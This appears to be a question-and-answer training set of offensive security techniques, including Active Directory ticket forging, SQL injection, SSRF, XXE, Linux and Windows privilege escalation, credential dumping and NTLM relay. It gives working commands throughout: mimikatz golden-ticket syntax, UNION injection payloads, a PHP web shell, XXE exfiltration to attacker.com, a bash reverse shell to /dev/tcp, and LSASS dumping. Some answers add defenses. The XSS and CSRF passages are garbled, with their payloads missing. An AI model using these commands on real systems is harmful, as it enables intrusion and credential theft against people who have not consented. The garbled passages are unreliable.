Golden Ticket: forges a Ticket Granting Ticket (TGT) using the krbtgt account's NT hash. The krbtgt hash is used to encrypt and sign all TGTs; with it, an attacker can forge a TGT for any user, any group membership (including Enterprise Admins), with any expiry. Impact: persistent access even after password resets (until krbtgt is rotated twice); the TGT is valid domain-wide. Obtain krbtgt hash: mimikatz lsadump::dcsync /domain:corp /user:krbtgt or dump from a DC's NTDS.dit. Create golden ticket: mimikatz kerberos::golden /domain:corp.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /user:Administrator /groups:512,519 /id:500 /ptt (passth-ticket -- inject directly into memory). Verification: klist shows the forged ticket; dir \\dc\c$ works. Silver Ticket: forges a Service Ticket (TGS) using a service account's NT hash (not krbtgt). The TGS is encrypted with the service account's key -- the KDC is not involved in validation; the service directly validates. Scope: access only to the specific service (CIFS, HTTP, MSSQL, HOST) on the specific host. Advantage: no KDC interaction at all -- completely avoids detection from DC logs. Obtain service account hash: from lsass (if service account has logged on) or from NTDS.dit. Create silver ticket: mimikatz kerberos::golden /domain:corp.local /sid:DOMAIN_SID /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /user:Administrator /ptt. Mitigation: reset krbtgt password twice (invalidates all existing TGTs including golden tickets); gMSA service accounts rotate automatically (prevents silver tickets for those services); Privileged Access Workstations.
Explain evasion techniques for bypassing next-gen firewalls and web proxies.

NGFW and web proxy evasion: (1) Domain fronting (largely blocked by CDNs) -- use a CDN domain in the SNI (which NGFW sees) but set the Host header to the C2 domain (which the CDN routes based on Host); CDN TLS termination hides the true destination from the NGFW. (2) TLS via port 443 -- most NGFWs allow TLS on 443; C2 using legitimate TLS profiles (mimicking Salesforce or Microsoft traffic in Malleable C2) passes TLS-based inspection. (3) DNS over HTTPS (DoH) -- bypass DNS-based C2 blocking; DNS queries tunnelled in HTTPS to a DoH resolver; some NGFWs block DoH providers. (4) HTTPS CONNECT tunnel -- if the proxy allows CONNECT to arbitrary ports, tunnel any protocol: openssl s_client -connect proxy:8080 -proxytunnel. (5) HTTP chunked encoding -- some proxy inspection is confused by chunked transfer encoding; send payload in many small chunks. (6) IPv6 -- many NGFWs have weaker IPv6 rule sets; if IPv6 is available, attempt to use it. (7) Web categories -- register C2 domain and categorise it (update Webshrinker/BlueCoat categories) as business software before the campaign; avoid newly-registered domain blocklists (use aged domains). (8) TLS inspection bypass -- mutual TLS pinning, certificate transparency monitoring can detect interception; some malware detects TLS inspection via certificate chain changes and aborts. (9) ICMP and DNS tunneling -- last resort; very low bandwidth but works through environments that block all TCP/UDP to the internet except DNS.
Explain memory forensics for detecting fileless malware.

Fileless malware detection via memory forensics: Fileless malware resides only in memory (PowerShell empire, Cobalt Strike in-memory beacon, shellcode runners); no binary written to disk; traditional file scanning finds nothing. Detection approach: (1) Process analysis -- volatility3 windows.pslist; look for: PowerShell or cmd.exe spawned by Office processes (Word, Excel, Outlook) -- T1566 phishing; PowerShell with encoded command line; processes with no on-disk image (windows.dlllist shows 'UNKNOWN' for module path). (2) Memory injection detection -- windows.malfind: scans for private memory regions with PAGE_EXECUTE_READWRITE or PAGE_EXECUTE flags that are not backed by a file on disk; typical shellcode or reflectively-loaded PE signature. (3) Network connections from unexpected processes -- windows.netstat: svchost.exe making outbound connections to non-Microsoft IPs on port 443; legitimate svchost.exe connects only to Microsoft update infrastructure. (4) String analysis -- volatility windows.strings: search for: 'IEX', 'DownloadString', 'FromBase64String' (PowerShell fileless patterns); C2 URLs; shellcode markers (\x90\x90 NOP sleds, \xfc\xe8 common shellcode header). (5) PowerShell logging -- Event 4104 (Script Block Logging) captures de-obfuscated PowerShell commands even for fileless execution; search for: Invoke-Expression, IEX, DownloadString, Net.WebClient, reflection loading, AMSI bypass patterns. (6) ETW telemetry -- Microsoft-Windows-Threat-Intelligence provider (ETWTI) records: kernel-level injection events, PROCESS_INJECT_CROSS_PROCESS, shellcode injection to specific addresses. (7) YARA on memory dump -- run YARA rules against full memory dump for known shellcode signatures, Cobalt Strike watermarks, Metasploit stageless payload headers.
How do you exploit SQL injection to extract data from a database?

SQL injection exploitation steps: (1) Detect -- inject ' or '' in every parameter; error messages or changed behavior confirm injection. (2) Determine injection type -- error-based (see DB error), blind boolean (page behavior changes on true/false condition), time-based blind (response delays on SLEEP/WAITFOR). (3) Union-based extraction -- find number of columns: ' ORDER BY 1-- through ORDER BY N-- until error; then ' UNION SELECT NULL,NULL,...--; match column count. Get DB version: ' UNION SELECT @@version,NULL,NULL--. List tables: ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- (MySQL). (4) Extract credentials: ' UNION SELECT username,password FROM users-- ; crack hashes offline. (5) Blind boolean: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- ; automate with sqlmap -u URL --data='param=val' --dbs --dump. (6) Time-based: '; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'-- (MSSQL). (7) File read/write (MySQL): UNION SELECT LOAD_FILE('/etc/passwd'),NULL--; SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'. (8) OS execution (MSSQL): EXEC xp_cmdshell 'whoami'. Always use sqlmap --level=5 --risk=3 for thoroughness; tamper scripts bypass WAFs (--tamper=space2comment,between).
Explain Cross-Site Scripting (XSS) -- stored, reflected, and DOM-based -- and how to exploit each.

XSS types and exploitation: (1) Reflected XSS -- payload in request parameter echoed in response; victim must click crafted URL: https://site.com/search?q=; cookie theft requires HttpOnly not set; if HttpOnly set, use XSS to perform actions as victim (CSRF via XSS). (2) Stored XSS -- payload persists in database, shown to all users who view the page; highest impact; e.g., comment field: ; targets admin panels to steal admin session or perform privileged actions. (3) DOM-based XSS -- sink in JavaScript reads from attacker-controlled source without going to server; sources: location.hash, location.search, document.referrer; sinks: innerHTML, document.write(), eval(), location.href; example: page does document.write(location.hash) -- visit page#. (4) Bypass techniques: case variation
How does CSRF work and what are the modern bypass techniques?

Cross-Site Request Forgery (CSRF) forces authenticated users to perform unintended actions. Mechanism: victim is logged in to bank.com (session cookie auto-sent); attacker hosts or a form that auto-submits via JS; browser sends cookie automatically. CSRF tokens: server generates random per-session or per-request token embedded in forms; server validates token on POST; attacker cannot read token due to SOP. Bypass techniques: (1) Token not tied to session -- if token is static and predictable (e.g., based on username) guess or reuse from own account. (2) Token in URL -- token leaks via Referer header to attacker site. (3) JSON CSRF -- if endpoint accepts JSON but also accepts text/plain, submit form with enctype=text/plain and crafted body that is valid JSON. (4) CORS misconfiguration -- if API has Access-Control-Allow-Origin: * and CSRF token is fetched via API, attacker can read it. (5) Subdomain XSS -- if xss exists on sub.victim.com, XSS can read CSRF token from main.victim.com (same site, different subdomain; SameSite=Strict prevents, Lax allows GET). (6) SameSite cookie bypass -- Lax allows cookies on top-level GET navigations; POST is blocked; use GET-based state-changing endpoints. Defenses: SameSite=Strict cookies (strongest), synchroniser tokens, double-submit cookie, custom request headers (X-Requested-With).
What is SSRF and how do you escalate it to full compromise?

SSRF (Server-Side Request Forgery) makes the server issue requests to arbitrary destinations. Initial discovery: URL parameters (url=, src=, href=, redirect=, callback=), PDF generators, webhook URLs, image upload-by-URL. Basic test: change URL to http://169.254.169.254/latest/meta-data/ (AWS IMDSv1) -- if response contains AWS metadata, SSRF confirmed and critical. Escalation paths: (1) AWS metadata -- GET /latest/meta-data/iam/security-credentials/ returns role name; GET /latest/meta-data/iam/security-credentials/ROLENAME returns AccessKeyId, SecretAccessKey, Token; use with AWS CLI to access S3, EC2, Lambda, Secrets Manager. (2) Internal service access -- probe RFC1918: http://10.0.0.1-254, http://192.168.1.1-254; discover internal APIs, admin panels, Kubernetes API (https://kubernetes.default.svc/api/v1/secrets), Consul, etcd, Redis (connect and issue commands via HTTP-like protocol). (3) Cloud provider endpoints -- GCP: http://metadata.google.internal/computeMetadata/v1/ (requires Metadata-Flavor: Google header); Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (requires Metadata: true). (4) Blind SSRF -- use Burp Collaborator or interactsh.com; look for DNS lookups or HTTP requests confirming SSRF even without response. (5) Protocol smuggling -- use gopher:// to send raw TCP to Redis/Memcached/SMTP: gopher://127.0.0.1:6379/_%2A1%0D%0A... IMDSv2 mitigation requires PUT request for token first; bypass if token TTL not enforced. Filter bypass: 169.254.169.254 -> 0xA9FEA9FE (hex), 2852039166 (decimal), http://[::ffff:169.254.169.254].
How do you exploit XML External Entity (XXE) injection?

XXE exploits insecure XML parsers that process external entity declarations. (1) Basic file read: send XML with DOCTYPE declaring external entity pointing to /etc/passwd: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>; if parser resolves entities and response echoes value, file content returned. (2) Windows file read: file:///c:/windows/win.ini or file:///c:/users/administrator/desktop/flag.txt. (3) Blind XXE -- no response reflected; use out-of-band: <!ENTITY xxe SYSTEM 'http://attacker.com/?data=xxe'> -- server sends DNS/HTTP to attacker. (4) Blind XXE with data exfil: host a malicious DTD at http://attacker.com/evil.dtd containing: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % exfil '<!ENTITY % send SYSTEM "http://attacker.com/?f=%file;">'>%exfil;%send; reference from XML: <!DOCTYPE foo [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]>. (5) SSRF via XXE: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>. (6) Denial of service (Billion Laughs): nested entity expansion causes exponential memory use. (7) XInclude: when full DOCTYPE control not possible, inject <xi:include parse='text' href='file:///etc/passwd'/> in data value. Prevention: disable external entity processing (factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)); use JSON APIs instead of XML; validate and sanitise XML input.
Explain path traversal and how to bypass common filters.

Path traversal allows reading files outside the web root by manipulating file path parameters. Basic: ?file=../../../../etc/passwd -- each../ moves up one directory from web root. Bypass techniques: (1) URL encoding:../ -> %2e%2e%2f or %2e%2e/ or..%2f. (2) Double encoding: %252e%252e%252f (server decodes once to %2e%2e%2f then processes). (3) Unicode/UTF-8:../ ->..%c0%af or %c0%ae%c0%ae%c0%af (overlong UTF-8). (4) Filter bypass -- if../ stripped (once):....// (stripping once leaves../). (5) Null byte: ?file=../../../../etc/passwd%00.jpg (if code appends extension, null truncates; older PHP/C). (6) Absolute path: ?file=/etc/passwd directly if check only for../ not absolute paths. (7) Windows-specific:..\..\..\ or %5c; drive letter bypass: c:\windows\win.ini. Target files: /etc/passwd, /etc/shadow (if permissions allow), /proc/self/environ (may contain env vars with secrets), /proc/self/cmdline (running command), ~/.ssh/id_rsa, web application config files (database credentials), /var/log/apache2/access.log (for log poisoning -- inject PHP in User-Agent then include the log file). Prevention: use basename() to strip directory components; resolve canonical path and validate it starts with intended base directory; never pass user input directly to file system APIs.
How do you test and exploit insecure direct object reference (IDOR)?

IDOR occurs when an application uses user-controllable input to access objects without proper authorization checks. Testing methodology: (1) Identify object references -- numeric IDs (/api/invoices/1337), GUIDs (/files/a3f2-...), usernames (/profile/john), hashed IDs (often just MD5 of ID -- crack it). (2) Horizontal IDOR -- change your ID to another user's: GET /api/orders/1001 -> change to /api/orders/1002; if you get another user's order, IDOR confirmed. (3) Vertical IDOR -- access higher-privilege objects: regular user changing role field to admin in profile update request. (4) HTTP method switch -- if GET is protected, try POST/PUT/DELETE with same ID. (5) Parameter pollution -- add duplicate ID parameter: ?id=1001&id=1002; some parsers use second value. (6) Encoded/hashed IDs -- MD5('user_1002') -> try accessing; JWT sub field swap. (7) Chained IDOR -- use one IDOR to get data needed (email, username) for second attack. (8) Mass assignment -- send extra fields in JSON PUT body (role, verified, credit) that get saved without authorization. Automation: Burp Suite Intruder or Autorize extension (logs responses for two different accounts, flags when lower-privilege account gets 200 for higher-privilege resource). Impact ranges from data disclosure to full account takeover to business logic bypass. Prevention: indirect references (map session-specific tokens to real IDs server-side), verify ownership on every request.
Explain the OAuth 2.0 authorization code flow and common vulnerabilities.

OAuth 2.0 authorization code flow: (1) User clicks 'Login with Google'; app redirects to https://accounts.google.com/o/oauth2/auth?client_id=APP_ID&redirect_uri=https://app.com/callback&response_type=code&scope=email&state=RANDOM_STATE. (2) User authenticates with Google and grants consent. (3) Google redirects to app callback with code and state: https://app.com/callback?code=AUTH_CODE&state=RANDOM_STATE. (4) App exchanges code for tokens: POST to /token with code, client_id, client_secret, redirect_uri. (5) App uses access_token to call Google API (e.g., userinfo endpoint) to get user identity. Common vulnerabilities: (1) Missing state parameter -- no CSRF protection; attacker can initiate flow and send victim the authorization URL; if victim clicks, attacker's code gets linked to victim's account (account takeover). (2) Open redirect in redirect_uri -- if app validates only origin (allow list is lax): redirect_uri=https://app.com/callback%40attacker.com leaks auth code to attacker. (3) Authorization code injection -- attacker intercepts or obtains code and replays it. (4) Token leakage via Referer -- access_token in fragment (#) not sent in Referer, but in some implementations token in query string leaks. (5) Implicit flow token theft -- deprecated flow where token is in URL fragment; XSS can steal it. (6) PKCE bypass -- if S256 not enforced and plain is accepted, downgrade to plain and manipulate code_challenge. (7) Account pre-hijacking -- attacker creates account with victim email before victim uses OAuth; when victim authenticates via OAuth, app merges to attacker-created account.
How do you find and exploit business logic vulnerabilities?

Business logic flaws are application-specific; automated scanners miss them. Methodology: (1) Understand the business flow -- map every step of checkout, subscription, access control, approval workflows. (2) Skip steps -- in multi-step process (add to cart -> enter shipping -> pay -> confirm), try jumping directly to /confirm without paying. (3) Negative values -- enter -1 quantity in cart; if total becomes negative, store may owe you credit; price = -$100 processes refund or free balance. (4) Race conditions -- two simultaneous requests to redeem a one-time coupon; if check-then-use is not atomic, both succeed; use Burp Repeater 'Send group in parallel' or Python asyncio. (5) Workflow bypass -- apply coupon code that requires Premium tier while on Free tier; change role/tier parameter in request. (6) Limit bypass -- free tier allows 3 exports/day; observe parameter export_count=3 in cookie or local storage; change to 0 and make more requests. (7) Trust boundary violations -- price calculated client-side and submitted in POST body; change price=0.01; server trusts submitted price without revalidation. (8) Currency/unit confusion -- API accepts amount in dollars; change currency code parameter to a low-value currency while amount stays in dollars. (9) Excessive data exposure -- API returns full user object including SSN, dob, internal flags; frontend hides fields in UI but they are in response. (10) Second-order flaws -- stored input processed later under different security context (SQL injection in username field processed by scheduled job).
Explain HTTP request smuggling and how to detect it.

HTTP request smuggling exploits discrepancies between front-end (load balancer/proxy) and back-end server interpretation of HTTP request boundaries. Ambiguity arises from conflicting Content-Length (CL) and Transfer-Encoding (TE) headers. Attack types: (1) CL.TE -- front-end uses Content-Length, back-end uses Transfer-Encoding; attacker sends: POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED; front-end reads 13 bytes (0

 SMUGG), forwards to backend; backend processes chunked: 0 = end of chunks, SMUGGLED remains in buffer; next legitimate request gets prepended with SMUGGLED data. (2) TE.CL -- front-end uses TE, back-end uses CL. (3) TE.TE -- both support TE but obfuscation tricks one: Transfer-Encoding: xchunked or Transfer-Encoding :	chunked. Detection: (1) Timing test -- send request designed to cause backend time-out if vulnerable; CL.TE: send CL larger than body, chunked with terminator; if delay, TE.CL vulnerable. (2) Differential response -- poison request causes next response to contain smuggled prefix; compare responses. Tools: Burp Suite HTTP Request Smuggler extension automates detection. Impact: capture other users' requests (steal sessions, credentials submitted in POST bodies), bypass WAF/access controls by prepending malicious headers, web cache poisoning, credential hijacking. Fix: use HTTP/2 end-to-end; normalise ambiguous requests at edge; disable TE on front-end if not needed.
How do you escalate privileges on Linux after gaining a low-privilege shell?

Linux privilege escalation methodology: (1) Enumerate identity -- id; whoami; groups; check sudoers: sudo -l (what can current user run as root?). (2) SUID/SGID binaries -- find / -perm -4000 -type f 2>/dev/null; check GTFOBins for any listed binary (e.g., find, vim, cp, nmap, python). (3) Sudo misconfigurations -- sudo -l shows (ALL) NOPASSWD: /usr/bin/vim -> sudo vim -c ':!/bin/bash'. (4) Writable /etc/passwd -- if writable: add root2:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash; su root2. (5) Cron jobs -- cat /etc/cron* /etc/cron.d/ /var/spool/cron/; pspy (process spy without root) watches processes; if cron runs script writable by user: inject reverse shell. (6) PATH hijacking in root cron -- cron runs /opt/backup.sh which calls 'tar' without full path; create malicious tar in writable directory prepended to PATH. (7) Capabilities -- getcap -r / 2>/dev/null; python3 with cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'. (8) Writable service files -- ls -la /etc/systemd/system; if writable, add ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'. (9) NFS root squash disabled -- showmount -e; if no_root_squash, mount share and create SUID binary. (10) Kernel exploits -- uname -r; check CVE databases (DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195); use as last resort (unstable). LinPEAS automates all enumeration.
Explain how to exploit sudo misconfigurations for privilege escalation.

Sudo misconfigurations are one of the most reliable Linux privesc paths. Common scenarios: (1) ALL NOPASSWD -- sudo -l shows (ALL) NOPASSWD: ALL; sudo /bin/bash gives root immediately. (2) Specific binary escalation -- GTFOBins.github.io documents every binary: sudo find /tmp -exec /bin/bash \; (find with -exec runs arbitrary commands); sudo python3 -c 'import os; os.system("/bin/bash")'; sudo awk 'BEGIN {system("/bin/bash")}'; sudo vim -c ':!/bin/bash'; sudo less /etc/passwd -> !bash. (3) Environment variable exploitation -- if sudoers has env_keep+=LD_PRELOAD: create shared library that calls setuid(0) and executes shell; compile as.so; sudo LD_PRELOAD=/tmp/evil.so /usr/bin/allowed-command. (4) Wildcard in path -- sudo /opt/scripts/*.sh; create /opt/scripts/evil.sh; may not work if sudo resolves glob before execution; depends on shell. (5) Sudo version vulnerabilities -- sudo < 1.8.28 CVE-2019-14287: sudo -u#-1 /bin/bash; sudo < 1.9.5p2 CVE-2021-3156 (Baron Samedit) heap overflow -- works even without sudo permissions. (6) Restricted shell bypass -- if sudo allows running rbash; escape: sudo vim -> :set shell=/bin/bash -> :shell. Always verify: sudo -V for version; sudo -l for permissions; check for CVEs on version.
How do you exploit SUID binaries for privilege escalation?

SUID (Set User ID) binaries run with the owner's privileges (usually root) regardless of who executes them. Find them: find / -perm -u=s -type f 2>/dev/null or find / -perm -4000 2>/dev/null. Exploitation using GTFOBins: (1) /usr/bin/find -- find. -exec /bin/bash -p \; (-p preserves effective UID = root shell). (2) /usr/bin/cp -- cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p. Or overwrite /etc/passwd or /etc/sudoers. (3) /usr/bin/vim -- vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'. (4) /usr/bin/python -- python -c 'import os; os.setuid(0); os.system("/bin/bash")'. (5) /bin/bash itself with SUID -- /bin/bash -p gives root shell. (6) /usr/bin/nmap (older versions) -- nmap --interactive -> !sh. (7) /usr/bin/env -- env /bin/sh -p. (8) Custom SUID binary -- decompile with Ghidra/strings; look for system() calls with relative paths (PATH hijacking); look for sprintf into fixed buffer (buffer overflow); check if it reads user-controlled files as root (file read as root). (9) Shared library hijacking -- use ldd on SUID binary to find linked libs; if lib path writable or LD_LIBRARY_PATH exploitable (rare with SUID): place malicious.so. SUID should be minimised in production; audit with find / -perm -4000 and verify each is legitimate.
How do you exploit writable cron jobs and scheduled tasks for privilege escalation?

Cron-based privilege escalation: (1) Discover cron jobs -- cat /etc/crontab; ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/; crontab -l (current user); sudo crontab -l (root's cron if accessible); use pspy to monitor processes in real-time without root:./pspy64; watch for root (UID=0) processes that run periodically. (2) Writable script -- if /etc/cron.d/backup runs /opt/backup.sh as root and /opt/backup.sh is world-writable: echo 'chmod +s /bin/bash' >> /opt/backup.sh; wait for cron execution; /bin/bash -p. (3) Writable directory -- script called without full path from writable directory; create malicious file with same name. (4) Wildcard injection -- cron runs: tar czf /backup.tar.gz /home/*; create files: touch /home/--checkpoint=1; touch /home/--checkpoint-action=exec=bash\ shell.sh; tar processes these as flags, executing shell.sh as root. (5) PATH-based hijacking -- cron PATH includes /home/user/bin; script calls 'python' without full path; create /home/user/bin/python as shell launcher. (6) Race condition -- script downloads and executes remote file; MITM the download or replace file between download and execution. Systematic approach: always run pspy for 2-3 minutes after getting shell to capture all scheduled activity; then cross-reference with file permissions.
Explain Linux capabilities and how they can be exploited.

Linux capabilities divide root privileges into discrete units. Instead of full SUID root, a binary can have specific capabilities. View: getcap -r / 2>/dev/null (system-wide); cat /proc/$$/status | grep CapPrm (current process). Exploitable capabilities: (1) cap_setuid -- python3 with cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'; node.js: process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: 'inherit'}). (2) cap_net_raw -- allows creating raw sockets; tcpdump can sniff without root; can capture credentials from network traffic. (3) cap_sys_admin -- most powerful; allows mount, unshare, etc.; can escape containers; can read /proc/kcore. (4) cap_dac_override -- override file permission checks; can read/write any file; cat /etc/shadow as non-root binary. (5) cap_chown -- change file ownership; chown current user /etc/shadow. (6) cap_sys_ptrace -- attach to any process with ptrace(); inject shellcode into root process. (7) cap_net_bind_service -- bind to privileged ports (<1024); useful for phishing but not direct privesc. Container-specific: Docker default drops many capabilities but cap_sys_admin in container can escape. Check container: capsh --print; if cap_sys_admin present and /proc/sysrq-trigger writable, container escape is possible. GTFOBins also documents capability-based escalations.
How do you escalate privileges on Windows from a low-privilege shell?

Windows privilege escalation methodology: (1) Enumerate privileges -- whoami /priv; key privileges: SeImpersonatePrivilege (service accounts -- use Potato exploits), SeDebugPrivilege (dump LSASS), SeBackupPrivilege (read any file including SAM/NTDS.dit), SeRestorePrivilege (write any file, modify services), SeTakeOwnershipPrivilege (take ownership of any object). (2) Misconfigured services -- sc qc <service> shows binary path; accesschk.exe -ucqv <service> checks permissions; if SERVICE_ALL_ACCESS or CHANGE_CONFIG: sc config <service> binpath='cmd /c net localgroup administrators user /add' && sc stop/start <service>. (3) Unquoted service path -- service binary path with spaces not quoted: C:\Program Files\Vuln Service\service.exe; Windows tries C:\Program.exe, C:\Program Files\Vuln.exe first; place payload at C:\Program.exe. (4) AlwaysInstallElevated -- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated; if 0x1: msiexec /quiet /qn /i malicious.msi runs as SYSTEM. (5) Stored credentials -- cmdkey /list; credentials in registry: reg query HKLM /f password /t REG_SZ /s; unattend.xml, sysprep.inf. (6) Token impersonation -- if SeImpersonatePrivilege: PrintSpoofer.exe -i -c cmd (Windows 10/Server 2019); Potato variants (RottenPotato, SweetPotato, JuicyPotato). WinPEAS automates all enumeration.
Explain Potato exploits for Windows privilege escalation.

Potato exploits leverage the SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege) to escalate from service account (IIS, MSSQL, Network Service) to SYSTEM. Privilege available to: IIS app pool accounts, MSSQL service account, any service running as Network Service or Local Service. Core mechanism: service accounts can impersonate clients; attacker forces SYSTEM to authenticate to attacker-controlled named pipe or COM server; attacker impersonates the SYSTEM token. Variants by OS: (1) JuicyPotato (Windows Server 2016 and earlier) -- abuses DCOM; specify a CLSID for a COM server running as SYSTEM: JuicyPotato.exe -l 1337 -p C:\windows\system32\cmd.exe -a '/c whoami' -t * -c {CLSID}; CLSID varies by OS version. (2) RoguePotato (Server 2019 / Windows 10) -- uses RPC instead of DCOM; requires local port forwarding on attacker machine. (3) PrintSpoofer (Server 2019/2016/2012, Win 10) -- abuses SpoolSS named pipe; PrintSpoofer.exe -i -c cmd; simplest and most reliable on modern systems. (4) GodPotato (2023) -- works on Windows Server 2012-2022 and Windows 8-11; most current variant. (5) SweetPotato -- combines PrintSpoofer and EfsPotato. Usage: upload binary via web shell or file transfer; execute via shell; obtain SYSTEM shell or add admin user. If SeImpersonate present and you're on a service account, a Potato exploit gives SYSTEM with near-100% reliability on supported versions.
How do you perform credential dumping on Windows?

Windows credential dumping techniques: (1) LSASS dump (requires SeDebugPrivilege or SYSTEM): (a) Task Manager > Details > lsass.exe > Create dump file (GUI); (b) ProcDump: procdump.exe -ma lsass.exe lsass.dmp; (c) comsvcs.dll: rundll32 C:\windows\system32\comsvcs.dll, MiniDump PID lsass.dmp full; (d) copy lsass.dmp to attacker; parse with Mimikatz: sekurlsa::minidump lsass.dmp -> sekurlsa::logonpasswords. (2) Direct Mimikatz (if AV bypassed): privilege::debug -> sekurlsa::logonpasswords dumps cleartext passwords (WDigest if enabled), NTLM hashes, Kerberos tickets. (3) SAM database (local accounts): reg save HKLM\SAM sam.bak; reg save HKLM\SYSTEM system.bak; download both; secretsdump.py -sam sam.bak -system system.bak LOCAL -- extracts local account NTLM hashes. (4) NTDS.dit (Domain Controller, all domain hashes): (a) ntdsutil snapshot; (b) vssadmin create shadow /for=C:; copy shadow\windows\ntds\ntds.dit; (c) secretsdump.py -ntds ntds.dit -system system.bak LOCAL. (5) DPAPI -- decrypt browser passwords, credential manager: Mimikatz dpapi::chrome /in:Login Data /unprotect. (6) Credential Manager: cmdkey /list; Mimikatz vault::cred. (7) LSA secrets: secretsdump.py -target-ip DC -just-dc-ntlm domain/admin:pass. AV evasion: dump via shadow copy without touching LSASS process; use PPLdump to bypass Protected Process Light.
How do you pass the hash and what are the defenses?

Pass the Hash (PtH) uses a captured NTLM hash to authenticate without knowing the plaintext password, because NTLM authentication uses the hash directly. Attack: (1) Capture hash -- Mimikatz sekurlsa::logonpasswords; secretsdump from SAM/NTDS.dit; Responder NTLM capture. (2) Use hash for SMB: impacket smbclient.py domain/user@host -hashes :NTLM_HASH; crackmapexec smb 10.0.0.0/24 -u admin -H HASH --local-auth (lateral movement across subnet). (3) WMI execution: impacket wmiexec.py domain/user@host -hashes :HASH 'whoami'. (4) PSExec-style: impacket psexec.py domain/user@host -hashes :HASH cmd.exe. (5) Remote Desktop (RDP) -- RDP by default doesn't support PtH; exception: Restricted Admin mode (mstsc /restrictedadmin): mstsc with /restrictedadmin + xfreerdp with pth option: xfreerdp /u:admin /pth:HASH /v:host. (6) Kerberos PtH equivalent -- Pass the Ticket: inject Kerberos TGT (Mimikatz kerberos::ptt); or Overpass-the-Hash: Mimikatz sekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd.exe (creates new process with valid Kerberos tickets from NTLM hash). Defenses: Protected Users group prevents NTLM authentication for member accounts; Credential Guard protects hashes in isolated VSM; disable NTLM (force Kerberos only); LAPS prevents same local admin password across machines (limits lateral movement scope); network segmentation limits SMB access.
Explain Kerberoasting -- how it works and how to defend against it.

Kerberoasting targets service accounts with Service Principal Names (SPNs) registered in Active Directory. Mechanism: Any authenticated domain user can request a Kerberos service ticket (TGS) for any SPN; the TGS is encrypted with the service account's NTLM hash; attacker extracts the ticket and cracks the hash offline. Attack steps: (1) Find SPNs: Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName; or setspn -T domain -Q */*; impacket GetUserSPNs.py domain/user:pass -dc-ip DC. (2) Request TGS: Rubeus.exe kerberoast /outfile:hashes.txt (Windows); GetUserSPNs.py domain/user:pass -dc-ip DC -request (Linux/remote). (3) Crack offline: hashcat -m 13100 hashes.txt wordlist.txt --rules rockyou-30000.rule; hashcat -m 13100 hashes.txt -a 3 ?a?a?a?a?a?a?a?a. (4) Use credential to access service or pivot. Detection: event ID 4769 (Kerberos service ticket requested) with encryption type 0x17 (RC4) is anomalous -- modern systems use AES; spike in 4769 for service accounts. Defense: (1) Long random passwords for service accounts (25+ chars -- makes cracking infeasible). (2) Use Group Managed Service Accounts (gMSA) -- AD manages 120-char random password automatically. (3) Force AES encryption: set msDS-SupportedEncryptionTypes=24 on service accounts (RC4 ticket not issued, harder to crack). (4) Privileged service accounts in Protected Users group.
How do you perform NTLM relay attacks?

NTLM relay intercepts NTLM authentication and relays it to another target, authenticating as the victim. Prerequisites: SMB signing disabled (or not required) on target; victim must authenticate to attacker (coercion needed). Setup: (1) Disable SMB on attacker to avoid local auth: echo 'Responder SMB = Off; Responder HTTP = Off' and edit Responder.conf. (2) Start Responder to poison LLMNR/NBT-NS: Responder -I eth0 -rdwv; victims querying non-existent hostnames get attacker IP as response; their machines auto-authenticate. (3) Start ntlmrelayx: ntlmrelayx.py -tf targets.txt -smb2support; when victim authenticates, relay to targets in list; if target has admin rights for victim, shell or SAM dump returned. (4) Coercion techniques (active): PetitPotam (MS-EFSRPC): PetitPotam.py attacker_IP DC_IP -- forces DC to authenticate to attacker (requires patch KB5005413 to fix); SpoolSample (MS-RPRN): SpoolSample.exe target attacker -- forces target to authenticate via print spooler. (5) Advanced relay: LDAP relay for RBCD (Resource-Based Constrained Delegation): ntlmrelayx.py -t ldap://DC --delegate-access --escalate-user MACHINE$; creates delegation rights; then S4U2Self + S4U2Proxy to impersonate any user. Defense: enforce SMB signing (GPO: Microsoft network client/server digitally sign); disable LLMNR/NBT-NS (Registry: HKLM\SYSTEM\CurrentControlSet\Services\Dnscache); enable EPA (Extended Protection for Authentication) for LDAP.
How do you perform ARP spoofing and man-in-the-middle attacks on a LAN?

